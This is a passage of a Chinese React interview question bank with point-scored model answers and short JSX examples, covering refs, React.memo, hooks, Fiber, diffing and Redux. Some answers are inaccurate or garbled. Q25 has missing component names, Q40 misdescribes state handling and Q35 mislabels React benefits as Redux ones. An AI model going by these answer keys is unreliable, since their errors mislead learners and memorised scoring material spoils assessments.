分）</h4>\\n<ul>\\n<li><p>单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。</p>\\n</li>\\n<li><p>数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。</p>\\n</li>\\n<li><p>易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。</p>\\n</li>\\n<li><p>可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。</p>\\n</li>\\n</ul>\\n<h2>12. React中的Refs是什么？有哪些使用场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 创建和使用Refs：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">function TextInputWithFocusButton() {\\n  const inputRef = useRef(null);\\n\\n  const focusInput = () =&gt; {\\n    inputRef.current.focus();\\n  };\\n\\n  return (\\n    &lt;&gt;\\n      &lt;input ref={inputRef} type=&quot;text&quot; /&gt;\\n      &lt;button onClick={focusInput}&gt;Focus Input&lt;/button&gt;\\n    &lt;/&gt;\\n  );\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 转发Refs：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const FancyButton = React.forwardRef((props, ref) =&gt; (\\n  &lt;button ref={ref} className=&quot;fancy-button&quot;&gt;\\n    {props.children}\\n  &lt;/button&gt;\\n));\\n</code></pre>\\n<ul>\\n<li><p><strong>1：</strong> 常见使用场景：</p>\\n<ul>\\n<li>管理焦点、文本选择或媒体播放</li>\\n<li>触发强制动画</li>\\n<li>集成第三方DOM库</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用注意事项：</p>\\n<ul>\\n<li>避免过度使用Refs</li>\\n<li>不要用Refs来做可以通过声明式实现的事情</li>\\n<li>在类组件中使用需要通过React.createRef()创建</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>13. 什么是函数组件和类组件？它们有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>函数组件：</p>\\n</li>\\n<li><p>定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。</p>\\n</li>\\n<li><p>优点：代码更简洁，性能更好（因为没有类的开销）。</p>\\n</li>\\n<li><p>限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。</p>\\n</li>\\n<li><p>类组件：</p>\\n</li>\\n<li><p>定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。</p>\\n</li>\\n<li><p>优点：支持生命周期方法和状态管理，功能更强大。</p>\\n</li>\\n<li><p>缺点：代码相对复杂，性能略逊于函数组件。</p>\\n</li>\\n</ul>\\n<h2>14. React.memo 的作用和使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。</li>\\n<li><strong>1：</strong> 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。</li>\\n<li><strong>1：</strong> 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">import React from &#39;react&#39;;\\nconst UserInfo = ({ name, age }) =&gt; (\\n    &lt;div&gt;\\n        &lt;p&gt;Name: {name}&lt;/p&gt;\\n        &lt;p&gt;Age: {age}&lt;/p&gt;\\n    &lt;/div&gt;\\n);\\nexport default React.memo(UserInfo);\\n//在这个例子中，UserInfo 组件是一个纯展示组件。通过使用 React.memo 包裹它，当组件的 name 和 age props 没有变化时，组件就不会重新渲染，从而提高了性能。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">import React from &#39;react&#39;;\\nconst Sidebar = ({ menuData }) =&gt; {\\n    // 复杂的菜单渲染逻辑\\n    return (\\n        &lt;div&gt;\\n            {menuData.map((item) =&gt; (\\n                &lt;MenuItem key={item.id} item={item} /&gt;\\n            ))}\\n        &lt;/div&gt;\\n    );\\n};\\nexport default React.memo(Sidebar);\\n//通过使用 React.memo 包裹 Sidebar 组件，当父组件重新渲染但 menuData 没有变化时，Sidebar 组件就不会重新渲染，避免了不必要的渲染开销，提高了整个页面的性能。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">import React from &#39;react&#39;;\\nconst RealTimeChart = ({ dataArray, chartType }) =&gt; {\\n    // 复杂的图表绘制逻辑，可能涉及到数据处理、坐标轴设置等\\n    return (\\n        &lt;div&gt;\\n            &lt;Chart data={dataArray} type={chartType} /&gt;\\n        &lt;/div&gt;\\n    );\\n};\\nexport default React.memo(RealTimeChart);\\n//当数据更新时，只有 dataArray 或 chartType 发生变化，RealTimeChart 组件才会重新渲染，否则将使用之前的渲染结果，避免了因其他无关因素导致的重新渲染，提升了性能。\\n</code></pre>\\n</details>\\n\\n<h2>15. 什么是 React 中的高阶组件（HOC）？请简单举例说明其用法</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。</li>\\n<li><strong>1：</strong> 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。</li>\\n<li><strong>1：</strong> 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。</li>\\n</ul>\\n<h2>16. 什如何在 React 应用中进行有效的内存泄漏排查和修复？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；</li>\\n<li><strong>1：</strong> 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；</li>\\n<li><strong>1：</strong> 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。</li>\\n</ul>\\n<h2>17. 什么是纯组件？为什么要使用纯组件？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>纯组件：</p>\\n</li>\\n<li><p>纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。</p>\\n</li>\\n<li><p>优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。</p>\\n</li>\\n<li><p>使用场景：</p>\\n</li>\\n<li><p>静态数据：组件的 props 和 state 不经常变化。</p>\\n</li>\\n<li><p>复杂组件：组件内部逻辑复杂，重新渲染开销大。</p>\\n</li>\\n</ul>\\n<h2>18. 什么是 React Context API？它解决了什么问题？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>React Context API：</p>\\n</li>\\n<li><p>Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。</p>\\n</li>\\n<li><p>创建 Context：使用 React.createContext 创建一个 Context 对象。</p>\\n</li>\\n<li><p>提供 Context：使用 Context.Provider 组件将数据传递给子组件。</p>\\n</li>\\n<li><p>消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。</p>\\n</li>\\n</ul>\\n<h2>19. 什么是 React Router？它的主要特点是什么？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。</p>\\n</li>\\n<li><p>主要特点：</p>\\n</li>\\n<li><p>声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。</p>\\n</li>\\n<li><p>动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。</p>\\n</li>\\n<li><p>嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。</p>\\n</li>\\n<li><p>编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。</p>\\n</li>\\n<li><p>路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。</p>\\n</li>\\n<li><p>懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。</p>\\n</li>\\n</ul>\\n<h2>20. 什么是 useState？它如何工作？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>useState 是一个 Hook，用于在函数组件中添加状态。</p>\\n</li>\\n<li><p>主要特点：</p>\\n</li>\\n<li><p>初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。</p>\\n</li>\\n<li><p>更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-JSX\\">import React, { useState } from &#39;react&#39;;\\n\\nconst Counter = () =&gt; {\\n  const [count, setCount] = useState(0);\\n\\n  const increment = () =&gt; {\\n    setCount(count + 1);\\n  };\\n\\n  const decrement = () =&gt; {\\n    setCount(count - 1);\\n  };\\n\\n  return (\\n    &lt;div&gt;\\n      &lt;h1&gt;Count: {count}&lt;/h1&gt;\\n      &lt;button onClick={increment}&gt;Increment&lt;/button&gt;\\n      &lt;button onClick={decrement}&gt;Decrement&lt;/button&gt;\\n    &lt;/div&gt;\\n  );\\n};\\n\\nexport default Counter;\\n</code></pre>\\n<h2>21. 什么是 useEffect？它如何工作？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。</p>\\n</li>\\n<li><p>工作原理：</p>\\n</li>\\n<li><p>执行副作用：在组件挂载和更新时执行副作用操作。</p>\\n</li>\\n<li><p>清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-JSX\\">import React, { useState, useEffect } from &#39;react&#39;;\\n\\nconst DataFetcher = () =&gt; {\\n  const [data, setData] = useState(null);\\n\\n  useEffect(() =&gt; {\\n    const fetchData = async () =&gt; {\\n      const response = await fetch(&#39;/api/data&#39;);\\n      const json = await response.json();\\n      setData(json);\\n    };\\n\\n    fetchData();\\n\\n    // 清理函数\\n    return () =&gt; {\\n      console.log(&#39;Cleanup&#39;);\\n    };\\n  }, []); // 依赖数组为空，表示仅在组件挂载时执行\\n\\n  return (\\n    &lt;div&gt;\\n      {data ? &lt;pre&gt;{JSON.stringify(data, null, 2)}&lt;/pre&gt; : &lt;p&gt;Loading...&lt;/p&gt;}\\n    &lt;/div&gt;\\n  );\\n};\\n\\nexport default DataFetcher;\\n</code></pre>\\n<h2>22. 在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。</li>\\n</ul>\\n<h2>23. 说说对Fiber架构的理解？解决了什么问题？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>在react中，主要做了以下的操作：</p>\\n<ul>\\n<li><strong>1：</strong> 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务</li>\\n<li><strong>1：</strong> 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行</li>\\n<li><strong>1：</strong> dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行</li>\\n<li><strong>1：</strong> Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点</li>\\n</ul>\\n<h2>24. react无状态组件和class类组件的区别？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>直观区别，函数组件代码量较少，相比类组件更加简洁</p>\\n</li>\\n<li><p>函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑</p>\\n</li>\\n<li><p>因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间</p>\\n</li>\\n</ul>\\n<h2>25. react如何做到和vue中keep-alive的缓存效果</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li>React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key</li>\\n</ul>\\n<h2>26. React如何做路由监听</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<pre><code class=\\"language-react\\">\\ncomponentDidMount(){ this.context.router.history.listen((route)=&gt;{ if(route.pathname===&#39;/xxx&#39;){ console.log(1); } }); } \\n</code></pre>\\n<h2>27. React 中 keys 的作用是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。</p>\\n</li>\\n<li><p>在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-react\\">\\n  &lt;ul&gt;\\n  {todos.map((todo) =&gt;\\n    &lt;li key={todo.id}&gt;\\n      {todo.text}\\n    &lt;/li&gt;\\n  )};\\n  &lt;/ul&gt;\\n</code></pre>\\n<h2>28. React diff 原理</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>把树形结构按照层级分解，只比较同级元素。</p>\\n</li>\\n<li><p>列表结构的每个单元添加唯一的 key 属性，方便比较。</p>\\n</li>\\n<li><p>React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）</p>\\n</li>\\n<li><p>合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.</p>\\n</li>\\n<li><p>选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。</p>\\n</li>\\n</ul>\\n<h2>29. 受控组件和非受控组件有什么区别？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。</p>\\n</li>\\n<li><p>在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。</p>\\n</li>\\n</ul>\\n<h2>30. React如何进行代码拆分？拆分的原则是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。</p>\\n</li>\\n<li><p>在我们的react项目中：</p>\\n</li>\\n<li><p>在 api 层面我们单独封装，对外暴露 http 请求的结果。</p>\\n</li>\\n<li><p>数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。</p>\\n</li>\\n<li><p>视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。</p>\\n</li>\\n<li><p>静态类型的资源单独放置</p>\\n</li>\\n<li><p>公共组件、高阶组件、插件单独放置</p>\\n</li>\\n<li><p>工具类文件单独放置</p>\\n</li>\\n</ul>\\n<h2>31. 为什么说React中的props是只读的？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li>保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改</li>\\n</ul>\\n<h2>32. 使用Hooks要遵守哪些原则？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。</p>\\n</li>\\n<li><p>只在 React 函数中调用 Hook</p>\\n</li>\\n</ul>\\n<p>不要在普通的 JavaScript 函数中调用 Hook。你可以：</p>\\n<ul>\\n<li><p>在 React 的函数组件中调用 Hook</p>\\n</li>\\n<li><p>在自定义 Hook 中调用其他 Hook</p>\\n</li>\\n</ul>\\n<h2>33. 说说对高阶组件（HOC）的理解？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>高阶函数（Higher-order function），至少满足下列一个条件的函数</p>\\n</li>\\n<li><p>接受一个或多个函数作为输入</p>\\n</li>\\n<li><p>输出一个函数</p>\\n</li>\\n<li><p>在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件</p>\\n</li>\\n</ul>\\n<h2>34. 解释 React 中 render() 的目的？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。</li>\\n</ul>\\n<h2>35. Redux 有哪些优点？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。</p>\\n</li>\\n<li><p>可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。</p>\\n</li>\\n<li><p>服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。</p>\\n</li>\\n<li><p>开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。</p>\\n</li>\\n<li><p>社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。</p>\\n</li>\\n<li><p>易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。</p>\\n</li>\\n</ul>\\n<h2>36. React的事件和普通的HTML事件有什么不同？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>区别：</p>\\n<ul>\\n<li><p>对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；</p>\\n</li>\\n<li><p>对于事件函数处理语法，原生事件为字符串，react 事件为函数；</p>\\n</li>\\n<li><p>react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。</p>\\n</li>\\n</ul>\\n<p>合成事件是 react 模拟原生 DOM 事件所有能力的一个事件对象，其优点如下：</p>\\n<ul>\\n<li><p>兼容所有浏览器，更好的跨平台；</p>\\n</li>\\n<li><p>将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。</p>\\n</li>\\n<li><p>方便 react 统一管理和事务机制。</p>\\n</li>\\n</ul>\\n<p>事件的执行顺序为原生事件先执行，合成事件后执行，合成事件会冒泡绑定到 document 上，所以尽量避免原生事件与合成事件混用，如果原生事件阻止冒泡，可能会导致合成事件不执行，因为需要冒泡到document 上合成事件才会执行。</p>\\n<h2>37. React 组件中怎么做事件代理？它的原理是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>区别：</p>\\n<p>React基于Virtual DOM实现了一个SyntheticEvent层（合成事件层），定义的事件处理器会接收到一个合成事件对象的实例，它符合W3C标准，且与原生的浏览器事件拥有同样的接口，支持冒泡机制，所有的事件都自动绑定在最外层上。</p>\\n<p>在React底层，主要对合成事件做了两件事：</p>\\n<ul>\\n<li><p>事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。</p>\\n</li>\\n<li><p>自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。</p>\\n</li>\\n</ul>\\n<h2>38. React.Component 和 React.PureComponent 的区别</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>区别：</p>\\n<p>PureComponent表示一个纯组件，可以用来优化React程序，减少render函数执行的次数，从而提高组件的性能。：</p>\\n<p>在React中，当prop或者state发生变化时，可以通过在shouldComponentUpdate生命周期函数中执行return false来阻止页面的更新，从而减少不必要的render执行。React.PureComponent会自动执行 shouldComponentUpdate。</p>\\n<p>不过，pureComponent中的 shouldComponentUpdate() 进行的是浅比较，也就是说如果是引用数据类型的数据，只会比较不是同一个地址，而不会比较这个地址里面的数据是否一致。浅比较会忽略属性和或状态突变情况，其实也就是数据引用指针没有变化，而数据发生改变的时候render是不会执行的。如果需要重新渲染那么就需要重新开辟空间引用数据。PureComponent一般会用在一些纯展示组件上。</p>\\n<p>使用pureComponent的好处：当组件更新时，如果组件的props或者state都没有改变，render函数就不会触发。省去虚拟DOM的生成和对比过程，达到提升性能的目的。这是因为react自动做了一层浅比较。</p>\\n<h2>39. Component, Element, Instance 之间有什么区别和联系？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。</p>\\n</li>\\n<li><p>组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。</p>\\n</li>\\n<li><p>实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。</p>\\n</li>\\n</ul>\\n<p>函数式组件(Functional component)根本没有实例instance。类组件(Class component)有实例instance，但是永远也不需要直接创建一个组件的实例，因为React帮我们做了这些。</p>\\n<h2>40. React.createClass和extends Component的区别有哪些？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>语法区别</p>\\n<ul>\\n<li><p>createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。</p>\\n</li>\\n<li><p>createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。</p>\\n</li>\\n</ul>\\n<p>propType 和 getDefaultProps</p>\\n<ul>\\n<li><p>React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.</p>\\n</li>\\n<li><p>React.Component：通过设置两个属性propTypes和defaultProps</p>\\n</li>\\n</ul>\\n<p>状态的区别</p>\\n<ul>\\n<li><p>React.createClass：通过getInitialState()方法返回一个包含初始值的对象</p>\\n</li>\\n<li><p>React.Component：通过constructor构造函数设置初始状态</p>\\n</li>\\n</ul>\\n<p>this.state</p>\\n<ul>\\n<li><p>React.createClass：需要显示的调用this.setState()方法</p>\\n</li>\\n<li><p>React.Component：不需要调用，直接this.state获取</p>\\n</li>\\n</ul>\\n<p>Mixins</p>\\n<ul>\\n<li><p>React.createClass：通过mixins属性混合进来</p>\\n</li>\\n<li><p>React.Component：通过引入React Mixin</p>\\n</li>\\n</ul>\\n<h2>41. 对componentWillReceiveProps 